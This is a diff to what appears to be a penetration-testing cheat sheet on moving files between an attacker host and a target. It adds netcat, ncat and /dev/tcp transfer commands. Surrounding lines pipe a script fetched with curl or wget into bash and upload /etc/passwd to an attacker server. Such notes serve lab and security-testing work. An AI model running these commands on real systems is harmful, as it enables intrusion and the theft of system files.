@@ -42,6 +42,56 @@ wget -qO- http://$IP/test.sh | bash
 curl http://$IP/test.sh | bash
 ```
 
+### LOLBins (Netcat) download
+
+```bash
+# FROM ATTACKER TO TARGET (LISTEN ON TARGET)
+# ATTACKER
+nc -q 0 $IP 8000 < file.txt
+
+# TARGET
+nc -l -p 8000 > file.txt
+
+# FROM ATTACKER TO TARGET (SENDING FILE AS INPUT)
+# ATTACKER
+sudo nc -l -p 443 -q 0 < file.txt
+
+# TARGET
+nc $IP 443 > file.txt
+
+# FROM ATTACKER TO TARGET (RETRIEVE FILE USING /dev/tcp)
+# ATTACKER
+sudo nc -l -p 443 -q 0 < file.txt
+
+# TARGET
+cat < /dev/tcp/$IP/443 > file.txt
+```
+
+### LOLBins (Ncat) download
+
+```bash
+# FROM ATTACKER TO TARGET (LISTEN ON TARGET)
+# ATTACKER
+ncat --send-only $IP 8000 < file.txt
+
+# TARGET
+ncat -l -p 8000 --recv-only > file.txt
+
+# FROM ATTACKER TO TARGET (SENDING FILE AS INPUT)
+# ATTACKER
+sudo ncat -l -p 443 --send-only < file.txt
+
+# TARGET
+ncat $IP 443 --recv-only > file.txt
+
+# FROM ATTACKER TO TARGET (RETRIEVE FILE USING /dev/tcp)
+# ATTACKER
+sudo ncat -l -p 443 --send-only < file.txt
+
+# TARGET
+cat < /dev/tcp/$IP/443 > file.txt
+```
+
 ### SSH download
 
 ```bash
@@ -62,7 +112,7 @@ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sh
 mkdir https && cd https
 python3 -m uploadserver 443 --server-certificate ../server.pem
 
-# VICTIM
+# TARGET
 # Upload the file
 curl -X POST https://$IP/upload -F 'files=@/etc/passwd' --insecure
 ```
